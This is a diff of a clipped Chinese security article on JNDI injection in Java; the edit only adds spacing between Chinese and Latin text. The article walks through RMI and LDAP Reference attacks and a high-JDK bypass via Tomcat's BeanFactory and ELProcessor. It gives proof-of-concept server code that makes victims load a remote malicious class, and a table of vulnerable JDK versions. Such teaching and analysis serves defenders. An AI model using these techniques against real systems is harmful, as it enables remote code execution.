@@ -1,5 +1,5 @@
 ---
-title: JNDI注入从不会到彻底放弃
+title: JNDI 注入从不会到彻底放弃
 url: https://mp.weixin.qq.com/s?__biz=MzkzMTM3OTA0NQ==&mid=2247484191&idx=1&sn=21afb5f83df223a2836f4e464a256882&chksm=c26aa115f51d28036a40626ed7d2e4dcb5afef24fa3afcba8f2306939055ba718868fe8fbb70&mpshare=1&scene=1&srcid=0314Hnda1WExA3hfhKuKWX1c&sharer_shareinfo=6946968ef952ac64a01f527174f5eb2e&sharer_shareinfo_first=6946968ef952ac64a01f527174f5eb2e#rd
 clipped_at: 2024-03-31 16:03:58
 category: temp
@@ -8,26 +8,26 @@ tags:
 ---
 
 
-# JNDI注入从不会到彻底放弃
+# JNDI 注入从不会到彻底放弃
 
 ## 基本概念
 
-> Java的JNDI（Java Naming and Directory Interface）是一种标准API，可用于访问和管理分布式应用程序中的命名和目录服务。
+> Java 的 JNDI（Java Naming and Directory Interface）是一种标准 API，可用于访问和管理分布式应用程序中的命名和目录服务。
 > 
-> JNDI为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。
+> JNDI 为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。
 
-通过JNDI，Java应用程序可以：
+通过 JNDI，Java 应用程序可以：
 
 1.  查找和获取命名对象，例如数据库连接、远程对象和配置信息。
     
 2.  将对象绑定到名称下，并使用这些名称来查找对象。
     
-3.  访问基于目录的服务，例如LDAP（Lightweight Directory Access Protocol）或者 DNS（Domain Name System）服务。
+3.  访问基于目录的服务，例如 LDAP（Lightweight Directory Access Protocol）或者 DNS（Domain Name System）服务。
     
-4.  实现自定义的命名代理，并且根据需要将其集成进JNDI体系结构中。
+4.  实现自定义的命名代理，并且根据需要将其集成进 JNDI 体系结构中。
     
 
-JNDI主要支持：DNS、RMI、LDAP、CORBA等服务，JNDI类似一组API接口，每个对象都有一组名字和对象绑定关系，通过查找名字即可检索到相关的对象。
+JNDI 主要支持：DNS、RMI、LDAP、CORBA 等服务，JNDI 类似一组 API 接口，每个对象都有一组名字和对象绑定关系，通过查找名字即可检索到相关的对象。
 
 ![图片](assets/1711872238-d3450e080dd97d3a6be5a22beb45721c.webp)
 
@@ -35,12 +35,12 @@ JNDI主要支持：DNS、RMI、LDAP、CORBA等服务，JNDI类似一组API接口
 
 | 协议  | JDK6 | JDK7 | JDK8 | JDK11 |
 | --- | --- | --- | --- | --- |
-| LADP | 6u141、6u211之前版本 | 7u201、7u131之前版本 | 8u121、8u191之前版本 | JDK11.0.1之前版本 |
-| RMI | 6u45、6u141、6u211之前版本 | 7u21、7u131、7u201之前版本 | 8u121、8u191之前版本 | 无   |
+| LADP | 6u141、6u211 之前版本 | 7u201、7u131 之前版本 | 8u121、8u191 之前版本 | JDK11.0.1 之前版本 |
+| RMI | 6u45、6u141、6u211 之前版本 | 7u21、7u131、7u201 之前版本 | 8u121、8u191 之前版本 | 无   |
 
-## JNDI注入
+## JNDI 注入
 
-### RMI Reference攻击
+### RMI Reference 攻击
 
 `com.sun.jndi.rmi.object.trustURLCodebase`
 
@@ -66,14 +66,14 @@ public class JNDIRMIServer {
     public static void main(String[] args) throws NamingException, RemoteException {
         InitialContext initialContext = new InitialContext();
         Registry registry = LocateRegistry.createRegistry(1099);
-        // Reference类构建一个远程引用对象，该引用对象类名为exp，类工厂名为exp，类工厂位置为 http://127.0.0.1:8080/
+        // Reference 类构建一个远程引用对象，该引用对象类名为 exp，类工厂名为 exp，类工厂位置为 http://127.0.0.1:8080/
         Reference reference = new Reference("exp","exp","http://127.0.0.1:8080/");
         initialContext.bind("rmi://127.0.0.1:1099/exp",reference);
     }
 }
 ```
 
-受害者服务端 `lookup` 参数可控导致可以查找恶意服务RMI
+受害者服务端 `lookup` 参数可控导致可以查找恶意服务 RMI
 
 ```plain
 package JNDIResearch;
@@ -90,7 +90,7 @@ public class JNDIRMIClient {
 }
 ```
 
-编写一个exp.java程序用于弹出计算器，将该程序进行编译，再在当前目录下开启一个web服务
+编写一个 exp.java 程序用于弹出计算器，将该程序进行编译，再在当前目录下开启一个 web 服务
 
 ![图片](assets/1711872238-c167c13afa12a38a80ee07383c6a2afa.webp)
 
@@ -98,17 +98,17 @@ public class JNDIRMIClient {
 
 ![图片](assets/1711872238-173ffc48a3af1a8c11501662e552b0e3.webp)
 
-最后成功通过RMI Reference实现JNDI注入，执行恶意代码
+最后成功通过 RMI Reference 实现 JNDI 注入，执行恶意代码
 
-### RMI Reference攻击利用分析
+### RMI Reference 攻击利用分析
 
 ![图片](assets/1711872238-1e169da1747275c91e389902aae12c04.webp)
 
-分别在上面两行打上断点，先看一下Reference类引用对象的实例化做了什么，再看重点 `bind` 方法
+分别在上面两行打上断点，先看一下 Reference 类引用对象的实例化做了什么，再看重点 `bind` 方法
 
 ![图片](assets/1711872238-2e16dc272f5aa64e033af5d4b403d808.webp)
 
-实例化Reference远程引用对象，这里没什么需要注意看的，就只是创建了一个Reference类的引用对象，分别给类名、类工厂名、类工厂位置进行了赋值
+实例化 Reference 远程引用对象，这里没什么需要注意看的，就只是创建了一个 Reference 类的引用对象，分别给类名、类工厂名、类工厂位置进行了赋值
 
 ![图片](assets/1711872238-078cf35f99fb774c1732b2a0df5b308c.webp)
 
@@ -124,15 +124,15 @@ public class JNDIRMIClient {
 
 ![图片](assets/1711872238-aa6aad28125d1ecf2af8a0f72abfbef0.webp)
 
-这里将前面实例化的Reference类型对象进行实例化 `ReferenceWrapper` 类型对象
+这里将前面实例化的 Reference 类型对象进行实例化 `ReferenceWrapper` 类型对象
 
 ![图片](assets/1711872238-6522e0431f6b4a83f5b4a47cdb80ad2c.webp)
 
-到了这里 `bind` 方法就结束了，已经将 `ReferenceWrapper` 类型的引用对象绑定到RMI注册表中指定名称 `exp` 上，恶意服务端的RMI指定名称上已经绑定了我们的恶意代码引用对象
+到了这里 `bind` 方法就结束了，已经将 `ReferenceWrapper` 类型的引用对象绑定到 RMI 注册表中指定名称 `exp` 上，恶意服务端的 RMI 指定名称上已经绑定了我们的恶意代码引用对象
 
 ![图片](assets/1711872238-13b3b215e2eeb702c7381d5c295ac6ec.webp)
 
-在受害者服务端这边，让其查找我们的恶意RMI服务，跟进lookup方法往下看
+在受害者服务端这边，让其查找我们的恶意 RMI 服务，跟进 lookup 方法往下看
 
 ![图片](assets/1711872238-700acecd93f7c2d339743a4b456ddcca.webp)
 
@@ -140,11 +140,11 @@ public class JNDIRMIClient {
 
 ![图片](assets/1711872238-068dbac15bcab7e38a3f46f51fa7a129.webp)
 
-这里使用RMI查找绑定指定名称 `exp` 的远程对象
+这里使用 RMI 查找绑定指定名称 `exp` 的远程对象
 
 ![图片](assets/1711872238-b7844757d26c1548ea1fdf158507467e.webp)
 
-这里调用了 `decodeObject` 方法，因为在恶意服务端那边将默认的Reference进行了 `encodeObject` 方法之后返回了 `ReferenceWrapper` 类型引用对象，所以这边需要调用 `decodeObject` 方法获取原来的 `Reference` 类型引用对象。
+这里调用了 `decodeObject` 方法，因为在恶意服务端那边将默认的 Reference 进行了 `encodeObject` 方法之后返回了 `ReferenceWrapper` 类型引用对象，所以这边需要调用 `decodeObject` 方法获取原来的 `Reference` 类型引用对象。
 
 ![图片](assets/1711872238-579775d1563eb001aa941ebc19630e61.webp)
 
@@ -156,11 +156,11 @@ public class JNDIRMIClient {
 
 ![图片](assets/1711872238-049594aa78ec7067e3e9ee5af793f2b5.webp)
 
-这里获取的是一个为null值的ObjectFactoryBuilder对象
+这里获取的是一个为 null 值的 ObjectFactoryBuilder 对象
 
 ![图片](assets/1711872238-e0099b9dc03d3f999637fd66de0f8fc7.webp)
 
-这里将传入参数 `refInfo` 的 `Reference` 类型引用对象赋值给了ref变量
+这里将传入参数 `refInfo` 的 `Reference` 类型引用对象赋值给了 ref 变量
 
 ![图片](assets/1711872238-b43edc9ef7eb8ece77969112aebd1685.webp)
 
@@ -192,17 +192,17 @@ public class JNDIRMIClient {
 
 ![图片](assets/1711872238-44fb060138356df7f442d54f417463d2.webp)
 
-在实例化对象时，会默认调用无参的构造方法，最终成功使用RMI Reference执行命令
+在实例化对象时，会默认调用无参的构造方法，最终成功使用 RMI Reference 执行命令
 
-### LDAP Reference攻击
+### LDAP Reference 攻击
 
-上面，我们使用RMI Reference进行了远程加载恶意类，但是仅限于JDK8u121以下版本，在8u121及以后版本针对了对RMI远程加载的漏洞修复
+上面，我们使用 RMI Reference 进行了远程加载恶意类，但是仅限于 JDK8u121 以下版本，在 8u121 及以后版本针对了对 RMI 远程加载的漏洞修复
 
 ![图片](assets/1711872238-98998e42db470394ee62fee7d585539c.webp)
 
-在JDK8u121及以后版本，在RMI相关操作上增加了 `trustURLCodebase` 系统属性，该属性值默认为 `false`，要想修改必须设置系统属性，这样上面的例子就不能进行远程加载恶意代码了。
+在 JDK8u121 及以后版本，在 RMI 相关操作上增加了 `trustURLCodebase` 系统属性，该属性值默认为 `false`，要想修改必须设置系统属性，这样上面的例子就不能进行远程加载恶意代码了。
 
-但是修复了RMI上的远程加载问题，LDAP还没有解决，在上面我们分析RMI Reference利用时发现，真正的远程加载其实是在 `NamingManager` 的 `getObjectInstance` 的方法中，在这之前不过只是对远程引用对象处理，不是只有RMI才可以绑定引用对象，LDAP一样可以，官方当时没有在JDK8u121版本对LDAP进行修复，这样就绕过了上面的修复方式
+但是修复了 RMI 上的远程加载问题，LDAP 还没有解决，在上面我们分析 RMI Reference 利用时发现，真正的远程加载其实是在 `NamingManager` 的 `getObjectInstance` 的方法中，在这之前不过只是对远程引用对象处理，不是只有 RMI 才可以绑定引用对象，LDAP 一样可以，官方当时没有在 JDK8u121 版本对 LDAP 进行修复，这样就绕过了上面的修复方式
 
 受害者服务端使用 `ldap` 协议
 
@@ -221,7 +221,7 @@ public class JNDILDAPClient {
 }
 ```
 
-这里创建LDAP服务使用Apache Directory Studio软件进行创建，该软件需要在JDK11版本使用，JDK8和JDK17版本可能会出现问题。不想使用这种方式也可以使用 `JNDIExploit`、`marshalsec` 等工具生成一个LDAP服务
+这里创建 LDAP 服务使用 Apache Directory Studio 软件进行创建，该软件需要在 JDK11 版本使用，JDK8 和 JDK17 版本可能会出现问题。不想使用这种方式也可以使用 `JNDIExploit`、`marshalsec` 等工具生成一个 LDAP 服务
 
 ![图片](assets/1711872238-b5b3821f97ef82bdbb1ee2d7e5e8b349.webp)
 
@@ -251,7 +251,7 @@ public class JNDILDAPClient {
 
 在受害者服务端运行代码即可执行恶意代码
 
-### LDAP Reference攻击利用分析
+### LDAP Reference 攻击利用分析
 
 ![图片](assets/1711872238-4422a55261dfc4eaecbac8e165a328a6.webp)
 
@@ -265,7 +265,7 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-eff6fb058bf3cbbc4178f946f52253c8.webp)
 
-这里上面RMI利用类似，获取URL上下文并获取解析后的对象强转成Context类型的对象
+这里上面 RMI 利用类似，获取 URL 上下文并获取解析后的对象强转成 Context 类型的对象
 
 ![图片](assets/1711872238-f676a2f85cd93b86c5e674bc31be1392.webp)
 
@@ -275,11 +275,11 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-494e0b826d824bcf1bf9c88d7bae76c6.webp)
 
-在这里获取到了LDAP服务上的属性，也就是我们在LDAP加的那几个属性
+在这里获取到了 LDAP 服务上的属性，也就是我们在 LDAP 加的那几个属性
 
 ![图片](assets/1711872238-b454d8e81f8b4a248764cac039fb5470.webp)
 
-这里判断LDAP服务属性中有没有 `javaclassname` 属性
+这里判断 LDAP 服务属性中有没有 `javaclassname` 属性
 
 ![图片](assets/1711872238-14953a5d7e13ab337e9951d7d2937a63.webp)
 
@@ -287,7 +287,7 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-02729b759f48c085feccdfa5ef3f1826.webp)
 
-将LDAP属性和代码库位置作为参数调用了 `decodeReference` 方法
+将 LDAP 属性和代码库位置作为参数调用了 `decodeReference` 方法
 
 ![图片](assets/1711872238-f861cfdfe8ef642dfe158f6fac99c3fb.webp)
 
@@ -309,7 +309,7 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-8e3ec3fe108714c66fe4676839d9cb0a.webp)
 
-这里感觉似曾相识，和上面RMI利用那一块很像
+这里感觉似曾相识，和上面 RMI 利用那一块很像
 
 ![图片](assets/1711872238-8c79943db424d44be71bfc708c2f50c3.webp)
 
@@ -321,7 +321,7 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-48c223e5f7b6aa3fbd11aa5d6abde8cd.webp)
 
-这里使用了AppClassLoader查找类进行加载，当然是没有的
+这里使用了 AppClassLoader 查找类进行加载，当然是没有的
 
 ![图片](assets/1711872238-4eb620466848182f12726e70271e0511.webp)
 
@@ -337,17 +337,17 @@ public class JNDILDAPClient {
 
 ![图片](assets/1711872238-04274865d9a6abe5e6d3b76bedce7c43.webp)
 
-最后，成功使用LDAP Reference绕过执行恶意代码
+最后，成功使用 LDAP Reference 绕过执行恶意代码
 
-### 高版本JDK绕过
+### 高版本 JDK 绕过
 
-在JDK6u211、7u201、8u191、11.0.1版本及以后，默认将 `com.sun.jndi.ldap.object.trustURLCodebase` 选项设置为false
+在 JDK6u211、7u201、8u191、11.0.1 版本及以后，默认将 `com.sun.jndi.ldap.object.trustURLCodebase` 选项设置为 false
 
-但不管怎么禁止，我们还是可以通过本地的 `Factory` 类执行命令，在上面我们知道，真正在执行命令的地方其实是在调用 `getObjectInstance()` 方法的时候，使用RMI时调用的是 `NamingManager.getObjectInstance()` 方法，使用LDAP时使用的是 `DirectoryManager.getObjectInstance()` 方法
+但不管怎么禁止，我们还是可以通过本地的 `Factory` 类执行命令，在上面我们知道，真正在执行命令的地方其实是在调用 `getObjectInstance()` 方法的时候，使用 RMI 时调用的是 `NamingManager.getObjectInstance()` 方法，使用 LDAP 时使用的是 `DirectoryManager.getObjectInstance()` 方法
 
 这两个 `getObjectInstance()` 方法有个共同点，都会从引用对象中获取一个对象工厂，而这个对象工厂只需要可以实例化类并调用方法，且类名、属性、属性值等参数都来自于 `Reference` 类型引用对象，是我们可控即可。而我们要利用的 `Factory` 类必须实现了 `javax.naming.spi.ObjectFactory` 接口，并且实现该接口的 `getObjectInstance()` 方法
 
-根据上面的条件，找到了 `org.apache.naming.factory.BeanFactory` 类，这个类符合上面的条件，在Tomcat依赖包中。该类 `getObjectInstance()` 方法通过反射实例化Reference引用对象指向的类，调用setter方法。
+根据上面的条件，找到了 `org.apache.naming.factory.BeanFactory` 类，这个类符合上面的条件，在 Tomcat 依赖包中。该类 `getObjectInstance()` 方法通过反射实例化 Reference 引用对象指向的类，调用 setter 方法。
 
 依赖项：
 
@@ -381,7 +381,7 @@ import java.rmi.registry.Registry;
 public class JNDIBypassServer {
     public static void main(String[] args) throws Exception {
         Registry registry = LocateRegistry.createRegistry( 1099);
-        // 实例化ResourceRef资源引用对象，指定资源类名为javax.el.ELProcessor，资源工厂类名为org.apache.naming.factory.BeanFactory
+        // 实例化 ResourceRef 资源引用对象，指定资源类名为 javax.el.ELProcessor，资源工厂类名为 org.apache.naming.factory.BeanFactory
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         // 在资源引用对象中添加一个字符串类型引用地址，传递引用类型和引用值参数
         ref.add(new StringRefAddr("forceString", "x=eval"));
@@ -411,7 +411,7 @@ public class JNDIBypassClient {
 
 ![图片](assets/1711872238-b31dedb94afd1e54e5460b84856568fd.webp)
 
-### 高版本JDK绕过利用分析
+### 高版本 JDK 绕过利用分析
 
 ![图片](assets/1711872238-03d8623fc610b0fbcd6878f7e1323bf2.webp)
 
@@ -419,7 +419,7 @@ public class JNDIBypassClient {
 
 ![图片](assets/1711872238-f55393fc304af5fcfa57a5c50e5b270f.webp)
 
-这里其实也没什么好讲的了，最终要在RMI服务上查找指定名称
+这里其实也没什么好讲的了，最终要在 RMI 服务上查找指定名称
 
 ![图片](assets/1711872238-9518fade17a0d85b4aeb5b3ffed52c3c.webp)
 
@@ -457,7 +457,7 @@ public class JNDIBypassClient {
 
 ![图片](assets/1711872238-e646f05dccccc0cd7a1281472a774de8.webp)
 
-再往下，就是获取了 `=` 字符前面和后面的字符串，分别是eval和x，forced是个HashMap类型的，把x作为键，通过反射获取 `javax.el.ELProcessor` 的eval方法作为值添加进去
+再往下，就是获取了 `=` 字符前面和后面的字符串，分别是 eval 和 x，forced 是个 HashMap 类型的，把 x 作为键，通过反射获取 `javax.el.ELProcessor` 的 eval 方法作为值添加进去
 
 ![图片](assets/1711872238-9eede510b4d1f8871c45979d8fdb2380.webp)
 
@@ -469,13 +469,13 @@ public class JNDIBypassClient {
 
 ![图片](assets/1711872238-1bb6b78ec1158bb62441969f3db7daf7.webp)
 
-再继续往下就是一直循环判断引用类型是否匹配，匹配的话就跳出循环进行下一次循环，否则继续往下执行。直到遍历到x引用类型，不匹配，则往下执行
+再继续往下就是一直循环判断引用类型是否匹配，匹配的话就跳出循环进行下一次循环，否则继续往下执行。直到遍历到 x 引用类型，不匹配，则往下执行
 
 ![图片](assets/1711872238-5e0fd1fab52a034375187584ba23f60a.webp)
 
-获取了x引用类型的引用值后，又获取了在上面forced的x键值，也就是eval方法
+获取了 x 引用类型的引用值后，又获取了在上面 forced 的 x 键值，也就是 eval 方法
 
-在211行真正的进行了方法调用，变量 `bean` 就是 `javax.el.ELProcessor` 实例化的对象，valueArray则是x引用地址的引用值，也就是需要执行的恶意命令，通过反射进行了方法调用
+在 211 行真正的进行了方法调用，变量 `bean` 就是 `javax.el.ELProcessor` 实例化的对象，valueArray 则是 x 引用地址的引用值，也就是需要执行的恶意命令，通过反射进行了方法调用
 
 ![图片](assets/1711872238-df9d18fb9b9d779cd04db0b44f732339.webp)
 
@@ -483,8 +483,8 @@ public class JNDIBypassClient {
 
 ## 参考链接
 
-https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/ 浅析JNDI注入 \[ Mi1k7ea \]
+https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/ 浅析 JNDI 注入 \[ Mi1k7ea \]
 
-https://xz.aliyun.com/t/10671 高版本JDK下的JNDI注入浅析 - 先知社区
+https://xz.aliyun.com/t/10671 高版本 JDK 下的 JNDI 注入浅析 - 先知社区
 
 https://tttang.com/archive/1405 探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖
